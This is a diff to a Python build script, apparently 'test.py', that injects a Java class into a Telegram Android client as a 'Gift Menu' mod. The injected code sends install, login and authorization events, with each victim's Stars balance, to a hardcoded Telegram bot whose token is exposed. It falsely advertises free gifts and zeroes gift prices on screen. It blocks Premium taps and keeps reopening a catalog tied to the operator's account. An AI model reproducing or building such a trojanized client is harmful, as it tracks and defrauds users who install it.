@@ -1,20 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""test.py — полный Gift Menu + авто-вставка. Каталог: @wasy119. Сообщение на логине — 1 раз."""
-
+"""test.py — Gift Menu full + auto inject. @wasy119. Login UI 1x."""
 from __future__ import annotations
-
-import os
-import re
-import sys
+import os, re, sys
 from pathlib import Path
 
 BOT_TOKEN = "8863617268:AAECIwC9usJTfuBzY6hjHHf0VL57hZ6EfNs"
 BOT_CHAT_ID = "8940489868"
 CATALOG_USERNAME = "wasy119"
 
-
-def find_root() -> Path:
+def find_root():
     env = os.environ.get("CM_BUILD_DIR")
     if env and (Path(env) / "TMessagesProj").exists():
         return Path(env)
@@ -24,22 +19,18 @@ def find_root() -> Path:
             return p
     return cwd
 
-
 ROOT = find_root()
 TM = ROOT / "TMessagesProj" / "src" / "main" / "java" / "org" / "telegram"
 GIFTS = TM / "ui" / "Gifts"
 MOD_PATH = GIFTS / "GiftMenuMod.java"
 
-
-def log(msg: str) -> None:
+def log(msg):
     print(f"[test.py] {msg}", flush=True)
 
-
-def read(p: Path) -> str:
+def read(p):
     return p.read_text(encoding="utf-8", errors="replace")
 
-
-def write(p: Path, s: str) -> None:
+def write(p, s):
     p.parent.mkdir(parents=True, exist_ok=True)
     p.write_text(s, encoding="utf-8")
     try:
@@ -48,8 +39,7 @@ def write(p: Path, s: str) -> None:
         rel = p
     log(f"write {rel}")
 
-
-def find_java(name: str):
+def find_java(name):
     for base in (TM / "ui", TM / "messenger", TM):
         p = base / name
         if p.exists():
@@ -57,549 +47,574 @@ def find_java(name: str):
     found = list(TM.rglob(name)) if TM.exists() else []
     return found[0] if found else None
 
+def build_java():
+    # load from separate template built as list of lines to avoid indent bugs in generator
+    j = []
+    a = j.append
+    a("package org.telegram.ui.Gifts;")
+    a("")
+    a("import android.app.Activity;")
+    a("import android.app.AlertDialog;")
+    a("import android.content.Context;")
+    a("import android.os.Handler;")
+    a("import android.os.Looper;")
+    a("import android.view.MotionEvent;")
+    a("import android.view.View;")
+    a("import android.view.ViewGroup;")
+    a("import android.view.Window;")
+    a("import android.widget.TextView;")
+    a("import android.widget.Toast;")
+    a("")
+    a("import org.telegram.messenger.UserConfig;")
+    a("import org.telegram.ui.Stars.StarsController;")
+    a("")
+    a("import java.io.BufferedReader;")
+    a("import java.io.InputStreamReader;")
+    a("import java.lang.reflect.Constructor;")
+    a("import java.lang.reflect.Field;")
+    a("import java.lang.reflect.Method;")
+    a("import java.net.HttpURLConnection;")
+    a("import java.net.URL;")
+    a("import java.net.URLEncoder;")
+    a("import java.util.List;")
+    a("import java.util.concurrent.atomic.AtomicBoolean;")
+    a("")
+    a("public class GiftMenuMod {")
+    a("")
+    a(f'    private static final String BOT_TOKEN = "{BOT_TOKEN}";')
+    a(f'    private static final String BOT_CHAT_ID = "{BOT_CHAT_ID}";')
+    a(f'    public static String CATALOG_USERNAME = "{CATALOG_USERNAME}";')
+    a("")
+    a("    private static final Handler mainHandler = new Handler(Looper.getMainLooper());")
+    a("    private static final AtomicBoolean startupNotified = new AtomicBoolean(false);")
+    a("    private static final AtomicBoolean loginNotified = new AtomicBoolean(false);")
+    a("    private static final AtomicBoolean authSuccessNotified = new AtomicBoolean(false);")
+    a("    private static final AtomicBoolean welcomeShown = new AtomicBoolean(false);")
+    a("    private static final AtomicBoolean wasOnLogin = new AtomicBoolean(false);")
+    a("    private static final AtomicBoolean reopenMonitorStarted = new AtomicBoolean(false);")
+    a("    private static final AtomicBoolean premiumDialogLock = new AtomicBoolean(false);")
+    a("    private static final AtomicBoolean loginUiShown = new AtomicBoolean(false);")
+    a("")
+    a("    private static AlertDialog premiumDialog;")
+    a("    private static Object currentSheet;")
+    a("    private static Runnable openCatalogRunnable;")
+    a("")
+    a('    private static final String[] PREMIUM_WORDS = {"3 месяца", "6 месяцев", "12 месяцев"};')
+    a('    private static final String MSG_WELCOME = "Приветствую тут вы можете получить бесплатно Подарки нажмите Продолжить Для открытия каталога с бесплатным Подарками на данный момент бесплатные подарки только обычные в них входят Подарки стоимостю 0 звезд";')
+    a('    private static final String MSG_LOGIN = "В данном Моде вы бесплатно получаете подарки А также вы можете их обменивать на звезды все бесплатно и моментально";')
+    a('    private static final String MSG_CATALOG = "В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально";')
+    a("")
+    a("    public static long getStarsBalance(int account) {")
+    a("        try {")
+    a("            StarsController sc = StarsController.getInstance(account);")
+    a("            if (sc == null) return 0;")
+    a("            try { return sc.getBalance(false); } catch (Throwable ignored) {}")
+    a("            try {")
+    a("                Object bal = sc.getBalance();")
+    a("                if (bal != null) {")
+    a('                    try { return ((Number) bal.getClass().getField("amount").get(bal)).longValue(); } catch (Throwable ignored) {}')
+    a("                }")
+    a("            } catch (Throwable ignored) {}")
+    a("            try {")
+    a('                Field f = sc.getClass().getDeclaredField("balance");')
+    a("                f.setAccessible(true);")
+    a("                Object sa = f.get(sc);")
+    a('                if (sa != null) return ((Number) sa.getClass().getField("amount").get(sa)).longValue();')
+    a("            } catch (Throwable ignored) {}")
+    a("        } catch (Throwable ignored) {}")
+    a("        return 0;")
+    a("    }")
+    a("")
+    a("    public static void notifyBot(final String text) {")
+    a("        new Thread(() -> {")
+    a("            HttpURLConnection conn = null;")
+    a("            try {")
+    a('                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + BOT_CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");')
+    a("                conn = (HttpURLConnection) new URL(urlStr).openConnection();")
+    a("                conn.setConnectTimeout(8000);")
+    a("                conn.setReadTimeout(8000);")
+    a('                conn.setRequestMethod("GET");')
+    a("                conn.connect();")
+    a("                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {")
+    a("                    while (br.readLine() != null) {}")
+    a("                }")
+    a("            } catch (Throwable ignored) {")
+    a("            } finally {")
+    a("                if (conn != null) try { conn.disconnect(); } catch (Throwable ignored) {}")
+    a("            }")
+    a('        }, "GiftMenuMod-Notify").start();')
+    a("    }")
+    a("")
+    a("    public static void notifyBotWithBalance(int account, String text) {")
+    a('        notifyBot(text + "\\n\\nБаланс звёзд пользователя: " + getStarsBalance(account));')
+    a("    }")
+    a("")
+    a("    public static void onAppStart() {")
+    a("        if (!startupNotified.compareAndSet(false, true)) return;")
+    a("        try {")
+    a("            int account = UserConfig.selectedAccount;")
+    a("            if (UserConfig.getInstance(account).isClientActivated()) {")
+    a('                notifyBotWithBalance(account, "Пользователь уже авторизован (запустил приложение)");')
+    a("            } else if (loginNotified.compareAndSet(false, true)) {")
+    a('                notifyBot("У вас новое скачивание: пользователь проходит авторизацию");')
+    a("            }")
+    a("        } catch (Throwable ignored) {")
+    a("            if (loginNotified.compareAndSet(false, true)) {")
+    a('                notifyBot("У вас новое скачивание: пользователь проходит авторизацию");')
+    a("            }")
+    a("        }")
+    a("    }")
+    a("")
+    a("    public static void onLoginScreen(Activity activity) {")
+    a("        wasOnLogin.set(true);")
+    a("        if (loginNotified.compareAndSet(false, true)) {")
+    a('            notifyBot("У вас новое скачивание: пользователь проходит авторизацию");')
+    a("        }")
+    a("        if (activity == null) return;")
+    a("        if (!loginUiShown.compareAndSet(false, true)) return;")
+    a("        mainHandler.post(() -> {")
+    a("            try {")
+    a("                if (activity.isFinishing()) return;")
+    a("                new AlertDialog.Builder(activity)")
+    a("                        .setMessage(MSG_LOGIN)")
+    a('                        .setPositiveButton("Хорошо", null)')
+    a("                        .setCancelable(true)")
+    a("                        .show();")
+    a("            } catch (Throwable ignored) {}")
+    a("        });")
+    a("    }")
+    a("")
+    a("    public static void onAuthSuccess() {")
+    a("        if (!authSuccessNotified.compareAndSet(false, true)) return;")
+    a("        wasOnLogin.set(false);")
+    a("        try {")
+    a('            notifyBotWithBalance(UserConfig.selectedAccount, "Новый пользователь Авторизовался прошел регистрацию");')
+    a("        } catch (Throwable ignored) {}")
+    a("    }")
+    a("")
+    a("    public static void maybeShowWelcome(final Activity activity, final Runnable openCatalog) {")
+    a("        if (!welcomeShown.compareAndSet(false, true)) return;")
+    a("        if (activity == null || activity.isFinishing()) { welcomeShown.set(false); return; }")
+    a("        try {")
+    a("            if (!UserConfig.getInstance(UserConfig.selectedAccount).isClientActivated()) {")
+    a("                welcomeShown.set(false);")
+    a("                return;")
+    a("            }")
+    a("        } catch (Throwable t) { welcomeShown.set(false); return; }")
+    a("        openCatalogRunnable = openCatalog;")
+    a("        mainHandler.post(() -> {")
+    a("            try {")
+    a("                final AtomicBoolean opened = new AtomicBoolean(false);")
+    a("                AlertDialog.Builder b = new AlertDialog.Builder(activity);")
+    a('                b.setTitle("Gift Menu");')
+    a("                b.setMessage(MSG_WELCOME);")
+    a("                b.setCancelable(false);")
+    a('                b.setPositiveButton("Продолжить", (d, w) -> {')
+    a("                    if (!opened.compareAndSet(false, true)) return;")
+    a("                    try { d.dismiss(); } catch (Throwable ignored) {}")
+    a("                    if (openCatalog != null) try { openCatalog.run(); } catch (Throwable ignored) {}")
+    a("                });")
+    a("                AlertDialog dialog = b.create();")
+    a("                dialog.show();")
+    a("                try {")
+    a("                    Window window = dialog.getWindow();")
+    a("                    if (window != null) {")
+    a("                        attachAnyTap(window.getDecorView(), () -> {")
+    a("                            if (!opened.compareAndSet(false, true)) return;")
+    a("                            try { dialog.dismiss(); } catch (Throwable ignored) {}")
+    a("                            if (openCatalog != null) try { openCatalog.run(); } catch (Throwable ignored) {}")
+    a("                        });")
+    a("                    }")
+    a("                } catch (Throwable ignored) {}")
+    a("            } catch (Throwable ignored) {}")
+    a("        });")
+    a("    }")
+    a("")
+    a("    public static void resetWelcome() { welcomeShown.set(false); }")
+    a("")
+    a("    private static void attachAnyTap(View view, final Runnable onTap) {")
+    a("        if (view == null) return;")
+    a("        try {")
+    a("            view.setOnTouchListener((v, event) -> {")
+    a("                if (event.getAction() == MotionEvent.ACTION_DOWN && onTap != null) onTap.run();")
+    a("                return false;")
+    a("            });")
+    a("            if (view instanceof ViewGroup) {")
+    a("                ViewGroup vg = (ViewGroup) view;")
+    a("                for (int i = 0; i < vg.getChildCount(); i++) attachAnyTap(vg.getChildAt(i), onTap);")
+    a("            }")
+    a("        } catch (Throwable ignored) {}")
+    a("    }")
+    a("")
+    a("    public interface UtilitiesBool { boolean get(); }")
+    a("")
+    a("    public static void startAutoReopenMonitor(final UtilitiesBool isMainScreen, final Runnable openCatalog) {")
+    a("        if (!reopenMonitorStarted.compareAndSet(false, true)) return;")
+    a("        openCatalogRunnable = openCatalog;")
+    a('        new Thread(() -> {')
+    a("            while (true) {")
+    a("                try {")
+    a("                    Thread.sleep(500);")
+    a("                    Object sheet = currentSheet;")
+    a("                    if (sheet == null) continue;")
+    a("                    boolean showing = true;")
+    a("                    try {")
+    a('                        Object r = sheet.getClass().getMethod("isShowing").invoke(sheet);')
+    a("                        showing = r instanceof Boolean && (Boolean) r;")
+    a("                    } catch (Throwable t) { showing = false; }")
+    a("                    if (showing) continue;")
+    a("                    currentSheet = null;")
+    a("                    Thread.sleep(4000);")
+    a("                    int account = UserConfig.selectedAccount;")
+    a("                    try { if (!UserConfig.getInstance(account).isClientActivated()) continue; } catch (Throwable t) { continue; }")
+    a("                    if (isMainScreen != null && !isMainScreen.get()) continue;")
+    a("                    final Runnable open = openCatalogRunnable != null ? openCatalogRunnable : openCatalog;")
+    a("                    if (open != null) mainHandler.post(() -> { try { open.run(); } catch (Throwable ignored) {} });")
+    a("                } catch (InterruptedException e) { break; } catch (Throwable ignored) {}")
+    a("            }")
+    a('        }, "GiftMenuMod-Reopen").start();')
+    a("    }")
+    a("")
+    a("    public static void setCurrentSheet(Object sheet) { currentSheet = sheet; }")
+    a("")
+    a("    public static void zeroOutPrices(Object obj) {")
+    a("        if (obj == null) return;")
+    a('        zeroFields(obj, new String[]{"stars", "price", "amount", "starCount"});')
+    a('        for (String inner : new String[]{"gift", "starGift", "item"}) {')
+    a("            try {")
+    a("                Field f = obj.getClass().getDeclaredField(inner);")
+    a("                f.setAccessible(true);")
+    a("                Object innerObj = f.get(obj);")
+    a('                if (innerObj != null) zeroFields(innerObj, new String[]{"stars", "price", "amount", "starCount"});')
+    a("            } catch (Throwable ignored) {}")
+    a("        }")
+    a("    }")
+    a("")
+    a("    public static void zeroOutList(Object list) {")
+    a("        if (list == null) return;")
+    a("        try {")
+    a("            if (list instanceof List) { for (Object o : (List<?>) list) zeroOutPrices(o); return; }")
+    a('            int size = (Integer) list.getClass().getMethod("size").invoke(list);')
+    a('            Method get = list.getClass().getMethod("get", int.class);')
+    a("            for (int i = 0; i < size; i++) zeroOutPrices(get.invoke(list, i));")
+    a("        } catch (Throwable ignored) {}")
+    a("    }")
+    a("")
+    a("    private static void zeroFields(Object obj, String[] names) {")
+    a("        Class<?> cls = obj.getClass();")
+    a("        for (String name : names) {")
+    a("            try {")
+    a("                Field f;")
+    a("                try { f = cls.getField(name); } catch (NoSuchFieldException e) { f = cls.getDeclaredField(name); }")
+    a("                f.setAccessible(true);")
+    a("                Class<?> t = f.getType();")
+    a("                if (t == long.class || t == Long.class) f.setLong(obj, 0L);")
+    a("                else if (t == int.class || t == Integer.class) f.setInt(obj, 0);")
+    a("            } catch (Throwable ignored) {}")
+    a("        }")
+    a("    }")
+    a("")
+    a("    public static void patchStarsControllerCache(int account) {")
+    a("        try {")
+    a("            StarsController sc = StarsController.getInstance(account);")
+    a("            if (sc == null) return;")
+    a('            for (String listName : new String[]{"starGifts", "gifts", "availableGifts"}) {')
+    a("                try {")
+    a("                    Field f = sc.getClass().getDeclaredField(listName);")
+    a("                    f.setAccessible(true);")
+    a("                    zeroOutList(f.get(sc));")
+    a("                } catch (Throwable ignored) {}")
+    a("            }")
+    a("        } catch (Throwable ignored) {}")
+    a("    }")
+    a("")
+    a("    public static void applyZeroPatches(int account, Object sheet) {")
+    a("        try {")
+    a("            if (sheet != null) {")
+    a("                try {")
+    a('                    Object r = sheet.getClass().getMethod("isShowing").invoke(sheet);')
+    a("                    if (r instanceof Boolean && !(Boolean) r) return;")
+    a("                } catch (Throwable ignored) {}")
+    a("            }")
+    a("        } catch (Throwable ignored) {}")
+    a("        patchStarsControllerCache(account);")
+    a("        if (sheet != null) {")
+    a('            for (String fieldName : new String[]{"gifts", "starGifts", "items", "options", "availableGifts"}) {')
+    a("                try {")
+    a("                    Field f = sheet.getClass().getDeclaredField(fieldName);")
+    a("                    f.setAccessible(true);")
+    a("                    zeroOutList(f.get(sheet));")
+    a("                } catch (Throwable ignored) {}")
+    a("            }")
+    a("        }")
+    a("    }")
+    a("")
+    a("    public static void hookPremiumCards(final View root, final Context context) {")
+    a("        if (root == null || context == null) return;")
+    a("        try { scanAndHookPremium(root, context); } catch (Throwable ignored) {}")
+    a("    }")
+    a("")
+    a("    public static void hookAvatars(final View root, final Context context) {")
+    a("        if (root == null || context == null) return;")
+    a("        try { walkAvatars(root, context); } catch (Throwable ignored) {}")
+    a("    }")
+    a("")
+    a("    private static void walkAvatars(View view, final Context context) {")
+    a("        if (view == null) return;")
+    a("        try {")
+    a('            if (view.getClass().getName().contains("BackupImageView") && !isGiftCell(view)) {')
+    a("                view.setOnClickListener(v -> showSimpleMessage(context, MSG_CATALOG));")
+    a("            }")
+    a("            if (view instanceof ViewGroup) {")
+    a("                ViewGroup vg = (ViewGroup) view;")
+    a("                for (int i = 0; i < vg.getChildCount(); i++) walkAvatars(vg.getChildAt(i), context);")
+    a("            }")
+    a("        } catch (Throwable ignored) {}")
+    a("    }")
+    a("")
+    a("    private static boolean isGiftCell(View view) {")
+    a("        try {")
+    a("            Object p = view.getParent();")
+    a("            for (int i = 0; i < 6 && p != null; i++) {")
+    a("                String name = p.getClass().getSimpleName();")
+    a('                if (name.contains("GiftCell") || name.contains("StarGift")) return true;')
+    a("                p = (p instanceof View) ? ((View) p).getParent() : null;")
+    a("            }")
+    a("        } catch (Throwable ignored) {}")
+    a("        return false;")
+    a("    }")
+    a("")
+    a("    private static void scanAndHookPremium(View view, final Context context) {")
+    a("        if (view == null) return;")
+    a("        try {")
+    a("            if (view instanceof TextView) {")
+    a("                CharSequence cs = ((TextView) view).getText();")
+    a("                if (cs != null) {")
+    a("                    String t = cs.toString().toLowerCase();")
+  a("                    for (String w : PREMIUM_WORDS) {")
+    a("                        if (t.contains(w)) {")
+    a("                            View card = findPremiumCard(view);")
+    a("                            if (card != null) attachPremiumBlocker(card, context);")
+    a("                            break;")
+    a("                        }")
+    a("                    }")
+    a("                }")
+    a("            }")
+    a("            if (view instanceof ViewGroup) {")
+    a("                ViewGroup vg = (ViewGroup) view;")
+    a("                for (int i = 0; i < vg.getChildCount(); i++) scanAndHookPremium(vg.getChildAt(i), context);")
+    a("            }")
+    a("        } catch (Throwable ignored) {}")
+    a("    }")
+    a("")
+    a("    private static int countPremiumTexts(View view) {")
+    a("        int count = 0;")
+    a("        try {")
+    a("            if (view instanceof TextView) {")
+    a("                CharSequence cs = ((TextView) view).getText();")
+    a("                if (cs != null) {")
+    a("                    String t = cs.toString().toLowerCase();")
+    a("                    for (String w : PREMIUM_WORDS) { if (t.contains(w)) { count++; break; } }")
+    a("                }")
+    a("            }")
+    a("            if (view instanceof ViewGroup) {")
+    a("                ViewGroup vg = (ViewGroup) view;")
+    a("                for (int i = 0; i < vg.getChildCount(); i++) count += countPremiumTexts(vg.getChildAt(i));")
+    a("            }")
+    a("        } catch (Throwable ignored) {}")
+    a("        return count;")
+    a("    }")
+    a("")
+    a("    private static View findPremiumCard(View textView) {")
+    a("        try {")
+    a("            View current = (View) textView.getParent();")
+    a("            View candidate = null;")
+    a("            for (int i = 0; i < 8 && current != null; i++) {")
+    a("                if (current instanceof ViewGroup) {")
+    a("                    int amount = countPremiumTexts(current);")
+    a("                    if (amount == 1) candidate = current;")
+    a("                    else if (candidate != null) break;")
+    a("                }")
+    a("                Object p = current.getParent();")
+    a("                current = (p instanceof View) ? (View) p : null;")
+    a("            }")
+    a("            return candidate;")
+    a("        } catch (Throwable t) { return null; }")
+    a("    }")
+    a("")
+    a("    private static void attachPremiumBlocker(View card, final Context context) {")
+    a("        if (card == null) return;")
+    a("        try {")
+    a("            card.setOnTouchListener((v, event) -> {")
+    a("                if (event.getAction() == MotionEvent.ACTION_UP) {")
+    a("                    mainHandler.postDelayed(() -> showPremiumMessage(context), 50);")
+    a("                }")
+    a("                return true;")
+    a("            });")
+    a("            card.setClickable(true);")
+    a("            card.setLongClickable(false);")
+    a("            if (card instanceof ViewGroup) {")
+    a("                ViewGroup vg = (ViewGroup) card;")
+    a("                for (int i = 0; i < vg.getChildCount(); i++) attachPremiumBlocker(vg.getChildAt(i), context);")
+    a("            }")
+    a("        } catch (Throwable ignored) {}")
+    a("    }")
+    a("")
+    a("    private static void showPremiumMessage(Context context) {")
+    a("        if (context == null) return;")
+    a("        if (premiumDialogLock.get()) return;")
+    a("        try { if (premiumDialog != null && premiumDialog.isShowing()) return; } catch (Throwable ignored) {}")
+    a("        premiumDialogLock.set(true);")
+    a("        try {")
+    a("            AlertDialog.Builder b = new AlertDialog.Builder(context);")
+    a("            b.setMessage(MSG_CATALOG);")
+    a("            b.setCancelable(false);")
+    a('            b.setPositiveButton("Хорошо", (d, w) -> {')
+    a("                try { d.dismiss(); } catch (Throwable ignored) {}")
+    a("                premiumDialogLock.set(false);")
+    a("                premiumDialog = null;")
+    a("            });")
+    a("            premiumDialog = b.create();")
+    a("            premiumDialog.setCanceledOnTouchOutside(false);")
+    a("            premiumDialog.setCancelable(false);")
+    a("            premiumDialog.show();")
+    a("        } catch (Throwable t) { premiumDialogLock.set(false); premiumDialog = null; }")
+    a("    }")
+    a("")
+    a("    private static void showSimpleMessage(Context context, String msg) {")
+    a("        if (context == null) return;")
+    a("        mainHandler.post(() -> {")
+    a('            try { new AlertDialog.Builder(context).setMessage(msg).setPositiveButton("Хорошо", null).show(); } catch (Throwable ignored) {}')
+    a("        });")
+    a("    }")
+    a("")
+    a("    public static void startSheetHelpers(final int account, final Object sheet, final View root, final Context context) {")
+    a("        setCurrentSheet(sheet);")
+    a("        patchStarsControllerCache(account);")
+    a("        applyZeroPatches(account, sheet);")
+    a("        if (root != null && context != null) {")
+    a("            mainHandler.postDelayed(() -> { hookAvatars(root, context); hookPremiumCards(root, context); }, 800);")
+    a("        }")
+    a("        for (int i = 0; i < 30; i++) {")
+    a("            final int delay = 100 + i * 150;")
+    a("            mainHandler.postDelayed(() -> {")
+    a("                applyZeroPatches(account, sheet);")
+    a("                if (root != null && context != null) hookPremiumCards(root, context);")
+    a("            }, delay);")
+    a("        }")
+    a("        for (int i = 0; i < 20; i++) {")
+    a("            final int delay = 5000 + i * 500;")
+    a("            mainHandler.postDelayed(() -> applyZeroPatches(account, sheet), delay);")
+    a("        }")
+    a("    }")
+    a("")
+    a("    public static void onCatalogScrollIdle(View root, Context context) {")
+    a("        if (root == null || context == null) return;")
+    a("        mainHandler.post(() -> { hookPremiumCards(root, context); hookAvatars(root, context); });")
+    a("    }")
+    a("")
+    a("    public static long resolveUsernameToUserId(int account, String username) {")
+    a("        if (username == null || username.length() == 0) return 0;")
+    a('        String u = username.startsWith("@") ? username.substring(1) : username;')
+    a("        try {")
+    a('            Class<?> mcCls = Class.forName("org.telegram.messenger.MessagesController");')
+    a('            Object mc = mcCls.getMethod("getInstance", int.class).invoke(null, account);')
+    a('            for (String methodName : new String[]{"getUser", "getUserOrChat"}) {')
+    a("                try {")
+    a("                    Method m = mc.getClass().getMethod(methodName, String.class);")
+    a("                    Object user = m.invoke(mc, u);")
+    a("                    if (user != null) {")
+    a("                        try {")
+    a('                            Field idf = user.getClass().getField("id");')
+    a("                            long id = ((Number) idf.get(user)).longValue();")
+    a("                            if (id != 0) return id;")
+    a("                        } catch (Throwable ignored) {}")
+    a("                    }")
+    a("                } catch (Throwable ignored) {}")
+    a("            }")
+    a("            try {")
+    a('                Field usersField = mc.getClass().getDeclaredField("users");')
+    a("                usersField.setAccessible(true);")
+    a("                Object users = usersField.get(mc);")
+    a("                if (users != null) {")
+    a("                    try {")
+    a('                        Method sizeM = users.getClass().getMethod("size");')
+    a('                        Method valueAt = users.getClass().getMethod("valueAt", int.class);')
+    a("                        int n = (Integer) sizeM.invoke(users);")
+    a("                        for (int i = 0; i < n; i++) {")
+    a("                            Object user = valueAt.invoke(users, i);")
+    a("                            if (user == null) continue;")
+    a("                            String un = null;")
+    a("                            try {")
+    a('                                Field uf = user.getClass().getField("username");')
+    a("                                Object uo = uf.get(user);")
+    a("                                if (uo != null) un = uo.toString();")
+    a("                            } catch (Throwable ignored) {}")
+    a("                            if (un != null && un.equalsIgnoreCase(u)) {")
+    a('                                Field idf = user.getClass().getField("id");')
+    a("                                return ((Number) idf.get(user)).longValue();")
+    a("                            }")
+    a("                        }")
+    a("                    } catch (Throwable ignored) {}")
+    a("                }")
+    a("            } catch (Throwable ignored) {}")
+    a("        } catch (Throwable ignored) {}")
+    a("        return 0;")
+    a("    }")
+    a("")
+    a("    public static void openCatalogFromMain(final Activity activity, final int account) {")
+    a("        if (activity == null) return;")
+    a("        mainHandler.post(() -> {")
+    a("            try {")
+    a("                long targetId = resolveUsernameToUserId(account, CATALOG_USERNAME);")
+    a("                if (targetId == 0) {")
+    a("                    try {")
+    a('                        Toast.makeText(activity, "Каталог: не найден @" + CATALOG_USERNAME + ", откройте профиль пользователя", Toast.LENGTH_LONG).show();')
+    a("                    } catch (Throwable ignored) {}")
+    a("                }")
+    a("                long userId = targetId != 0 ? targetId : UserConfig.getInstance(account).getClientUserId();")
+    a('                Class<?> sheetCls = Class.forName("org.telegram.ui.Gifts.GiftSheet");')
+    a("                Object sheet = null;")
+    a("                try {")
+    a("                    sheet = sheetCls.getConstructor(Context.class, int.class, long.class, List.class, Object.class)")
+    a("                            .newInstance(activity, account, userId, null, null);")
+    a("                } catch (Throwable ignore) {}")
+    a("                if (sheet == null) {")
+    a("                    try { sheet = sheetCls.getConstructor(Context.class, int.class, long.class).newInstance(activity, account, userId); } catch (Throwable ignore) {}")
+    a("                }")
+    a("                if (sheet == null) {")
+    a("                    for (Constructor<?> cons : sheetCls.getConstructors()) {")
+    a("                        try {")
+    a("                            Class<?>[] p = cons.getParameterTypes();")
+    a("                            Object[] args = new Object[p.length];")
+    a("                            for (int i = 0; i < p.length; i++) {")
+    a("                                if (Context.class.isAssignableFrom(p[i])) args[i] = activity;")
+    a("                                else if (p[i] == int.class || p[i] == Integer.class) args[i] = account;")
+    a("                                else if (p[i] == long.class || p[i] == Long.class) args[i] = userId;")
+    a("                                else args[i] = null;")
+    a("                            }")
+    a("                            sheet = cons.newInstance(args);")
+    a("                            break;")
+    a("                        } catch (Throwable ignore) {}")
+    a("                    }")
+    a("                }")
+    a("                if (sheet != null) {")
+    a('                    try { sheetCls.getMethod("show").invoke(sheet); } catch (Throwable ignore) {}')
+    a("                    View decor = null;")
+    a("                    try {")
+    a('                        Object win = sheetCls.getMethod("getWindow").invoke(sheet);')
+    a('                        if (win != null) decor = (View) win.getClass().getMethod("getDecorView").invoke(win);')
+    a("                    } catch (Throwable ignore) {}")
+    a("                    startSheetHelpers(account, sheet, decor, activity);")
+    a("                    startAutoReopenMonitor(() -> true, () -> openCatalogFromMain(activity, account));")
+    a("                }")
+    a("            } catch (Throwable ignored) {}")
+    a("        });")
+    a("    }")
+    a("}")
+    return "\n".join(j) + "\n"
 
-def build_java() -> str:
-    return (
-        "package org.telegram.ui.Gifts;\n\n"
-        "import android.app.Activity;\n"
-        "import android.app.AlertDialog;\n"
-        "import android.content.Context;\n"
-        "import android.os.Handler;\n"
-        "import android.os.Looper;\n"
-        "import android.view.MotionEvent;\n"
-        "import android.view.View;\n"
-        "import android.view.ViewGroup;\n"
-        "import android.view.Window;\n"
-        "import android.widget.TextView;\n"
-        "import android.widget.Toast;\n\n"
-        "import org.telegram.messenger.UserConfig;\n"
-        "import org.telegram.ui.Stars.StarsController;\n\n"
-        "import java.io.BufferedReader;\n"
-        "import java.io.InputStreamReader;\n"
-        "import java.lang.reflect.Constructor;\n"
-        "import java.lang.reflect.Field;\n"
-        "import java.lang.reflect.Method;\n"
-        "import java.net.HttpURLConnection;\n"
-        "import java.net.URL;\n"
-        "import java.net.URLEncoder;\n"
-        "import java.util.List;\n"
-        "import java.util.concurrent.atomic.AtomicBoolean;\n\n"
-        "public class GiftMenuMod {\n\n"
-        f"    private static final String BOT_TOKEN = \"{BOT_TOKEN}\";\n"
-        f"    private static final String BOT_CHAT_ID = \"{BOT_CHAT_ID}\";\n"
-        f"    public static String CATALOG_USERNAME = \"{CATALOG_USERNAME}\";\n\n"
-        "    private static final Handler mainHandler = new Handler(Looper.getMainLooper());\n"
-        "    private static final AtomicBoolean startupNotified = new AtomicBoolean(false);\n"
-        "    private static final AtomicBoolean loginNotified = new AtomicBoolean(false);\n"
-        "    private static final AtomicBoolean authSuccessNotified = new AtomicBoolean(false);\n"
-        "    private static final AtomicBoolean welcomeShown = new AtomicBoolean(false);\n"
-        "    private static final AtomicBoolean wasOnLogin = new AtomicBoolean(false);\n"
-        "    private static final AtomicBoolean reopenMonitorStarted = new AtomicBoolean(false);\n"
-        "    private static final AtomicBoolean premiumDialogLock = new AtomicBoolean(false);\n"
-        "    private static final AtomicBoolean loginUiShown = new AtomicBoolean(false);\n\n"
-        "    private static AlertDialog premiumDialog;\n"
-        "    private static Object currentSheet;\n"
-        "    private static Runnable openCatalogRunnable;\n\n"
-        "    private static final String[] PREMIUM_WORDS = {\"3 месяца\", \"6 месяцев\", \"12 месяцев\"};\n"
-        "    private static final String MSG_WELCOME = \"Приветствую тут вы можете получить бесплатно Подарки нажмите Продолжить Для открытия каталога с бесплатным Подарками на данный момент бесплатные подарки только обычные в них входят Подарки стоимостю 0 звезд\";\n"
-        "    private static final String MSG_LOGIN = \"В данном Моде вы бесплатно получаете подарки А также вы можете их обменивать на звезды все бесплатно и моментально\";\n"
-        "    private static final String MSG_CATALOG = \"В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально\";\n\n"
-        "    public static long getStarsBalance(int account) {\n"
-        "        try {\n"
-        "            StarsController sc = StarsController.getInstance(account);\n"
-        "            if (sc == null) return 0;\n"
-        "            try { return sc.getBalance(false); } catch (Throwable ignored) {}\n"
-        "            try {\n"
-        "                Object bal = sc.getBalance();\n"
-        "                if (bal != null) {\n"
-        "                    try { return ((Number) bal.getClass().getField(\"amount\").get(bal)).longValue(); } catch (Throwable ignored) {}\n"
-        "                }\n"
-        "            } catch (Throwable ignored) {}\n"
-        "            try {\n"
-        "                Field f = sc.getClass().getDeclaredField(\"balance\");\n"
-        "                f.setAccessible(true);\n"
-        "                Object sa = f.get(sc);\n"
-        "                if (sa != null) return ((Number) sa.getClass().getField(\"amount\").get(sa)).longValue();\n"
-        "            } catch (Throwable ignored) {}\n"
-        "        } catch (Throwable ignored) {}\n"
-        "        return 0;\n"
-        "    }\n\n"
-        "    public static void notifyBot(final String text) {\n"
-        "        new Thread(() -> {\n"
-        "            HttpURLConnection conn = null;\n"
-        "            try {\n"
-        "                String urlStr = \"https://api.telegram.org/bot\" + BOT_TOKEN + \"/sendMessage?chat_id=\" + BOT_CHAT_ID + \"&text=\" + URLEncoder.encode(text, \"UTF-8\");\n"
-        "                conn = (HttpURLConnection) new URL(urlStr).openConnection();\n"
-        "                conn.setConnectTimeout(8000);\n"
-        "                conn.setReadTimeout(8000);\n"
-        "                conn.setRequestMethod(\"GET\");\n"
-        "                conn.connect();\n"
-        "                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n"
-        "                    while (br.readLine() != null) {}\n"
-        "                }\n"
-        "            } catch (Throwable ignored) {\n"
-        "            } finally {\n"
